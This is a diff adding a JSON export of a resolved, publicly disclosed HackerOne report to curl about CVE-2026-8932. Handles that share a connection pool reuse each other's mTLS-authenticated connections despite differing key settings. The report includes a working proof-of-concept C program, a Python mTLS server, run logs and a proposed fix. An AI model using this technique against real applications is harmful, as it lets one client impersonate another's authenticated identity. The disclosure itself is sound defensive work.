@@ -1,0 +1,114 @@
+{
+  "id": 3733910,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzMzOTEw",
+  "url": "https://hackerone.com/reports/3733910",
+  "title": "CVE-2026-8932: incomplete mTLS config matching in conn reuse",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-13T21:34:53.862Z",
+  "submitted_at": "2026-05-13T21:34:54.204Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-8932",
+    "CVE-2022-27782"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:25:03.913Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:16:45.763Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nThis report (and my multiple subsequent ones) may come as a surprise, as I was assured that curl now had zero vulnerabilities in it.\n\nNonetheless, I think the CVE-2022-27782 fix (\"TLS and SSH connection too eager reuse\", commit `f18af4f874` 2022-05-09, \"tls: check more TLS details for connection reuse\") was incomplete: it moved a batch of SSL knobs into `ssl_primary_config` so conn-reuse would compare them, but left the credential-half of the mTLS pair behind in `ssl_config_data`. Two easy handles sharing a `CURLSH`/`CURLM` pool can reuse each other's authenticated TLS connection whenever they differ only on `SSLKEY`, `SSLKEY_BLOB`, `KEYPASSWD`, `SSLKEYTYPE`, or `SSLCERTTYPE`. The second handle silently inherits the first's authenticated identity to the server.\n\nThe conn-reuse gate is `match_ssl_primary_config` at `lib/vtls/vtls.c:194-225`, called via `Curl_ssl_conn_config_match` (`lib/vtls/vtls.c:227-240`) from `url_match_ssl_config` in `lib/url.c:991-1003`. Its argument type is `struct ssl_primary_config *` — it literally cannot see anything outside primary. The struct split is in `lib/urldata.h:143-168` (primary, compared) vs `lib/urldata.h:170-193` (`ssl_config_data`, not compared). `connectdata` (`lib/urldata.h:389-392`) only carries the primary copy into the pool, so once a conn is parked the full `ssl_config_data` it was born from is gone.\n\nA similar gap exists in the TLS session cache. `Curl_ssl_peer_key_make` (`lib/vtls/vtls_scache.c:137-294`) builds the scache lookup key from primary only, and for the client cert it just adds a literal `:CCERT` marker — same five bytes regardless of which key/cert is set:\n\n```c\nif(ssl->clientcert && ssl->clientcert[0]) {\n  r = curlx_dyn_add(&buf, \":CCERT\");\n```\n\nThe secondary auth-match check at `lib/vtls/vtls_scache.c:607-627` (`cf_ssl_scache_match_auth`) compares only `clientcert` and SRP creds — never key, key blob, key passwd, key type, or cert type. (Caveat: in practice the wrong-passwd case eagerly fails inside `client_cert()` before session-resume can hide it, so the scache gap is real-but-narrow for the passphrase variant specifically. The key-blob / key-type variants don't have that eager-fail.)\n\nPoC: two easy handles attached to a `CURLSH` with `CURL_LOCK_DATA_CONNECT` + `CURL_LOCK_DATA_SSL_SESSION`. Both target `https://server.test:8443/`, both set the same `SSLCERT=clientA.crt` / `SSLKEY=clientA.key`. Handle A sets `KEYPASSWD=\"aaa\"` (correct); handle B sets `KEYPASSWD=\"wrong-password\"`. Server is a tiny mTLS Python listener that requires `CERT_REQUIRED` and logs the peer subject per request.\n\nserver.py:\n\n```py\n#!/usr/bin/env python3\n\"\"\"\nmTLS server for F12 PoC. Requests/optionally requires a client cert and\nlogs the client cert subject for each request. Returns 200 OK with a\nsmall body. Designed for keep-alive connection reuse so the second\ncurl handle (B) reuses the TLS connection of the first (A).\n\nRun: python3 server.py\n\"\"\"\nimport socket\nimport ssl\nimport sys\nimport threading\nimport time\n\nHOST = \"127.0.0.1\"\nPORT = 8443\nSERVER_CERT = \"server.crt\"\nSERVER_KEY = \"server.key\"\n# Trust both clientA and clientB by accepting any self-signed cert with\n# CERT_OPTIONAL and just inspecting the subject; for stricter mTLS one\n# would CERT_REQUIRED + load_verify_locations with both client certs.\nCA_BUNDLE = \"clients-ca.pem\"\n\n\ndef make_ctx():\n    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    ctx.load_cert_chain(SERVER_CERT, SERVER_KEY)\n    # Require a client cert.\n    ctx.verify_mode = ssl.CERT_REQUIRED\n    ctx.load_verify_locations(CA_BUNDLE)\n    return ctx\n\n\nREPLY = (\n    \"HTTP/1.1 200 OK\\r\\n\"\n    \"Content-Length: 2\\r\\n\"\n    \"Connection: keep-alive\\r\\n\"\n    \"Keep-Alive: timeout=30\\r\\n\"\n    \"\\r\\n\"\n    \"ok\"\n)\n\n\ndef subj_str(cert_dict):\n    if not cert_dict:\n        return \"(no client cert)\"\n    parts = []\n    for rdn in cert_dict.get(\"subject\", ()):\n        for k, v in rdn:\n            parts.append(f\"{k}={v}\")\n    return \"/\".join(parts) if parts else \"(empty subject)\"\n\n\ndef read_request(sock):\n    buf = b\"\"\n    sock.settimeout(5.0)\n    while b\"\\r\\n\\r\\n\" not in buf and len(buf) < 65536:\n        try:\n            chunk = sock.recv(4096)\n        except socket.timeout:\n            break\n        if not chunk:\n            break\n        buf += chunk\n    return buf\n\n\ndef handle(client, addr, ctx):\n    try:\n        tls = ctx.wrap_socket(client, server_side=True)\n    except ssl.SSLError as e:\n        sys.stdout.write(f\"[server] TLS error from {addr}: {e}\\n\")\n        sys.stdout.flush()\n        client.close()\n        return\n    except OSError:\n        client.close()\n        return\n\n    peer = tls.getpeercert()\n    subj = subj_str(peer)\n    req_n = 0\n    try:\n        while True:\n            req = read_request(tls)\n            if not req:\n                break\n            req_n += 1\n            line0 = req.split(b\"\\r\\n\", 1)[0].decode(\"latin-1\", \"replace\")\n            sys.stdout.write(\n                f\"[server] conn={id(tls):x} req#{req_n} \"\n                f\"client_subject={subj} req='{line0}'\\n\"\n            )\n            sys.stdout.flush()\n            tls.sendall(REPLY.encode(\"ascii\"))\n    except Exception as e:\n        sys.stdout.write(f\"[server] handler error: {e}\\n\")\n        sys.stdout.flush()\n    finally:\n        try:\n            tls.close()\n        except Exception:\n            pass\n\n\ndef main():\n    ctx = make_ctx()\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((HOST, PORT))\n    s.listen(8)\n    print(f\"[server] mTLS listening on {HOST}:{PORT}\", flush=True)\n    s.settimeout(30.0)\n    end = time.time() + 25.0\n    while time.time() < end:\n        try:\n            client, addr = s.accept()\n        except socket.timeout:\n            break\n        t = threading.Thread(target=handle, args=(client, addr, ctx),\n                             daemon=True)\n        t.start()\n    s.close()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nand F12_poc.c:\n\n```c\n/*\n * F12 PoC: TLS connection-reuse with mismatched private-key config\n *\n * Two easy handles A and B sharing one connection pool (via curl_share +\n * CURL_LOCK_DATA_CONNECT and CURL_LOCK_DATA_SSL_SESSION) point at\n * https://server.test:8443/. Both configure CURLOPT_SSLCERT to certA.pem\n * (CN=alice). A has the correct CURLOPT_KEYPASSWD; B has a deliberately\n * wrong CURLOPT_KEYPASSWD (\"wrong-password\").\n *\n * Expected if curl correctly distinguished the SSL configurations of A\n * and B: B should not be able to reuse A's connection (its key cannot be\n * loaded with the wrong passphrase) and B's curl_easy_perform() should\n * fail with CURLE_SSL_CERTPROBLEM or similar.\n *\n * Observed (the bug):\n *   - match_ssl_primary_config in lib/vtls/vtls.c:194-225 only diffs\n *     struct ssl_primary_config.\n *   - CURLOPT_KEYPASSWD is stored in struct ssl_config_data.key_passwd\n *     (lib/urldata.h:179), NOT in primary -> never compared.\n *   - The cert PATH (primary.clientcert) matches for both A and B, and\n *     all other primary fields match (same verify settings, same scheme,\n *     etc.), so url_match_ssl_config returns TRUE.\n *   - B reuses A's connection, never tries to load its (wrong) key, and\n *     succeeds with HTTP 200. Server still sees CN=alice for B.\n *\n * Build:\n *   gcc -Wall -O0 -g -Icurl/include \\\n *       F12_poc.c \\\n *       curl/lib/.libs/libcurl.a \\\n *       -lssl -lcrypto -lz -lpsl -lzstd -lbrotlidec -lidn2 -lnghttp2 \\\n *       -lldap -llber -lssh2 -lpthread -ldl \\\n *       -o F12_poc\n *\n * Run (with server.py listening on 127.0.0.1:8443):\n *   F12_poc\n */\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <curl/curl.h>\n\n#define URL \"https://server.test:8443/\"\n#define HOST_RESOLVE \"server.test:8443:127.0.0.1\"\n\n#define CERT_PATH \"clientA.crt\"\n#define KEY_PATH  \"clientA.key\"\n#define PASS_A    \"aaa\"           /* correct */\n#define PASS_B    \"wrong-password\" /* deliberately wrong */\n\nstatic size_t silent_write(char *ptr, size_t size, size_t nmemb, void *udata)\n{\n  (void)ptr; (void)udata;\n  return size * nmemb;\n}\n\nstatic void set_common(CURL *eh, struct curl_slist *resolve, const char *tag)\n{\n  curl_easy_setopt(eh, CURLOPT_URL, URL);\n  curl_easy_setopt(eh, CURLOPT_RESOLVE, resolve);\n  curl_easy_setopt(eh, CURLOPT_SSL_VERIFYPEER, 0L);\n  curl_easy_setopt(eh, CURLOPT_SSL_VERIFYHOST, 0L);\n  curl_easy_setopt(eh, CURLOPT_WRITEFUNCTION, silent_write);\n  curl_easy_setopt(eh, CURLOPT_PRIVATE, (void *)tag);\n  curl_easy_setopt(eh, CURLOPT_VERBOSE, 1L);\n}\n\nint main(void)\n{\n  CURL *A, *B;\n  CURLSH *share;\n  struct curl_slist *resolve;\n  CURLcode ra, rb;\n  long codeA = 0, codeB = 0;\n  curl_off_t idA = -1, idB = -1;\n\n  curl_global_init(CURL_GLOBAL_ALL);\n\n  share = curl_share_init();\n  curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);\n  curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);\n\n  resolve = curl_slist_append(NULL, HOST_RESOLVE);\n\n  /* Handle A: SSLCERT=certA, SSLKEY=keyA, KEYPASSWD=\"aaa\" (correct).\n     Should connect cleanly and authenticate as CN=alice. */\n  A = curl_easy_init();\n  set_common(A, resolve, \"A(correct-passwd)\");\n  curl_easy_setopt(A, CURLOPT_SHARE, share);\n  curl_easy_setopt(A, CURLOPT_SSLCERT, CERT_PATH);\n  curl_easy_setopt(A, CURLOPT_SSLKEY, KEY_PATH);\n  curl_easy_setopt(A, CURLOPT_KEYPASSWD, PASS_A);\n\n  /* Handle B: SAME SSLCERT, SAME SSLKEY, WRONG KEYPASSWD.\n     Without conn reuse, B should fail to load its private key.\n     With the bug, B reuses A's connection and succeeds. */\n  B = curl_easy_init();\n  set_common(B, resolve, \"B(wrong-passwd)\");\n  curl_easy_setopt(B, CURLOPT_SHARE, share);\n  curl_easy_setopt(B, CURLOPT_SSLCERT, CERT_PATH);\n  curl_easy_setopt(B, CURLOPT_SSLKEY, KEY_PATH);\n  curl_easy_setopt(B, CURLOPT_KEYPASSWD, PASS_B);\n\n  fprintf(stderr, \"\\n=== Request A (correct passwd, expect 200) ===\\n\");\n  ra = curl_easy_perform(A);\n  curl_easy_getinfo(A, CURLINFO_RESPONSE_CODE, &codeA);\n  curl_easy_getinfo(A, CURLINFO_CONN_ID, &idA);\n  fprintf(stderr, \"A done: code=%ld conn_id=%lld ra=%s\\n\",\n          codeA, (long long)idA, curl_easy_strerror(ra));\n\n  fprintf(stderr, \"\\n=== Request B (WRONG passwd) ===\\n\");\n  fprintf(stderr, \"    expectation if curl gates conn reuse on KEYPASSWD: fail\\n\");\n  fprintf(stderr, \"    observed:                                          \\n\");\n  rb = curl_easy_perform(B);\n  curl_easy_getinfo(B, CURLINFO_RESPONSE_CODE, &codeB);\n  curl_easy_getinfo(B, CURLINFO_CONN_ID, &idB);\n  fprintf(stderr, \"B done: code=%ld conn_id=%lld rb=%s\\n\",\n          codeB, (long long)idB, curl_easy_strerror(rb));\n\n  if(idA >= 0 && idA == idB)\n    fprintf(stderr,\n            \"\\n*** B REUSED A's CONNECTION (conn_id %lld). \"\n            \"B's wrong KEYPASSWD was never validated. ***\\n\",\n            (long long)idA);\n  else if(rb == CURLE_OK && codeB == 200)\n    fprintf(stderr,\n            \"\\n*** B SUCCEEDED on a fresh connection despite wrong KEYPASSWD. \"\n            \"Resumed A's TLS session via shared scache (A=%lld B=%lld). ***\\n\",\n            (long long)idA, (long long)idB);\n  else\n    fprintf(stderr,\n            \"\\n--- B correctly failed (A=%lld B=%lld) ---\\n\",\n            (long long)idA, (long long)idB);\n\n  curl_easy_cleanup(A);\n  curl_easy_cleanup(B);\n  curl_share_cleanup(share);\n  curl_slist_free_all(resolve);\n  curl_global_cleanup();\n  return 0;\n}\n```\n\nBuild:\n\n```bash\ngcc -Wall -O0 -g -Icurl/include \\\n    F12_poc.c \\\n    curl/lib/.libs/libcurl.a \\\n    -lssl -lcrypto -lz -lpsl -lzstd -lbrotlidec -lidn2 -lnghttp2 \\\n    -lldap -llber -lssh2 -lpthread -ldl \\\n    -o F12_poc\n```\n\nRun (with `server.py` listening on 127.0.0.1:8443):\n\n```bash\n./F12_poc\n```\n\noutput:\n\n```text\n$ ./F12_poc\n\n=== Request A (correct passwd, expect 200) ===\n* Added server.test:8443:127.0.0.1 to DNS cache\n* Hostname server.test was found in DNS cache\n* Host server.test:8443 was resolved.\n* IPv6: (none)\n* IPv4: 127.0.0.1\n*   Trying 127.0.0.1:8443...\n* ALPN: curl offers h2,http/1.1\n* SSL Trust: peer verification disabled\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS\n* ALPN: server did not agree on a protocol. Uses default.\n* Server certificate:\n*   subject: CN=server.test\n*   start date: May 13 18:12:38 2026 GMT\n*   expire date: May 14 18:12:38 2026 GMT\n*   issuer: CN=server.test\n*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption\n* OpenSSL verify result: 12\n*  SSL certificate verification failed, continuing anyway!\n* Established connection to server.test (127.0.0.1 port 8443) from 127.0.0.1 port 59792\n* using HTTP/1.x\n> GET / HTTP/1.1\nHost: server.test:8443\nAccept: */*\n\n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Length: 2\n< Connection: keep-alive\n< Keep-Alive: timeout=30\n<\n* Connection #0 to host server.test:8443 left intact\nA done: code=200 conn_id=0 ra=No error\n\n=== Request B (WRONG passwd) ===\n    expectation if curl gates conn reuse on KEYPASSWD: fail\n    observed:                                          \n* Added server.test:8443:127.0.0.1 to DNS cache\n* Reusing existing https: connection with host server.test\n> GET / HTTP/1.1\nHost: server.test:8443\nAccept: */*\n\n* Request completely sent off\n< HTTP/1.1 200 OK\n< Content-Length: 2\n< Connection: keep-alive\n< Keep-Alive: timeout=30\n<\n* Connection #0 to host server.test:8443 left intact\nB done: code=200 conn_id=0 rb=No error\n\n*** B REUSED A's CONNECTION (conn_id 0). B's wrong KEYPASSWD was never validated. ***\n```\n\nServer log:\n\n```text\n[server] conn=7db7846f5470 req#1 client_subject=commonName=alice req='GET / HTTP/1.1'\n[server] conn=7db7846f5470 req#2 client_subject=commonName=alice req='GET / HTTP/1.1'\n```\n\nSo, it's the same `conn=...` and same `client_subject=alice` for both. B's wrong passphrase was never validated — its request rode A's open conn under A's authenticated identity. If `KEYPASSWD` had been part of the conn-reuse predicate, B would have either opened a fresh handshake (surfacing the bad-passphrase error) or refused reuse. B standalone (not attached to A's share) eagerly fails with `CURLE_SSL_CERTPROBLEM` (code 43) — so the gap genuinely is in the reuse decision, not in the key load.\n\nFix is the same shape as `f18af4f874` — promote the omitted fields into primary and add them to `match_ssl_primary_config`, plus mix the clientcert path into the scache key:\n\n```diff\n--- a/lib/urldata.h\n+++ b/lib/urldata.h\n struct ssl_primary_config {\n   ...\n   char *CRLfile;\n+  char *cert_type;\n+  char *key;\n+  char *key_type;\n+  char *key_passwd;\n+  struct curl_blob *key_blob;\n   struct curl_blob *cert_blob;\n   ...\n\n--- a/lib/vtls/vtls_scache.c\n+++ b/lib/vtls/vtls_scache.c\n   if(ssl->clientcert && ssl->clientcert[0]) {\n-    r = curlx_dyn_add(&buf, \":CCERT\");\n+    r = curlx_dyn_addf(&buf, \":CCERT-%s\", ssl->clientcert);\n```\n\n…with matching wiring in `clone_ssl_primary_config` / `free_primary_ssl_config` / `match_ssl_primary_config` and in `cf_ssl_scache_match_auth`. The passphrase should go into the in-memory `Curl_ssl_scache_peer` but NOT into the exportable variant (`CURL_SSLS_GLOBAL_SUFFIX`). (`fsslctx`/`fsslctxp` is intentionally out of scope here — that one's already documented as the caller's responsibility to pair with `FORBID_REUSE`.)\n\nOne small related sub-finding I came across while looking at this, same type of thing but mbedtls-only: `lib/vtls/mbedtls.c:891-894` unconditionally enables TLS 1.2 renegotiation, and the pinned-pubkey comparison at `lib/vtls/mbedtls.c:1071-1126` only runs once after the initial handshake — `Curl_pin_peer_pubkey` is not re-invoked when the server renegotiates with a different cert. Thought I'd mentoin it.\n\nAFAICT, this bug is practically the same thing as CVE-2022-27782.\n\nCheers,\nJoshua.\n\n## Impact\n\n A second curl_multi handle with wrong credentials (different key, key password, key type, or cert type) silently reuses an existing mTLS connection that was authenticated with a different client identity  — the server sees the first handle's certificate for all subsequent requests on that connection, regardless of what the second handle was configured with. For any application that maps mTLS client  identity to authorization decisions (mutual authentication, per-service API keys, client-cert–based RBAC), this means one handle can impersonate another's authenticated session within the same process.",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
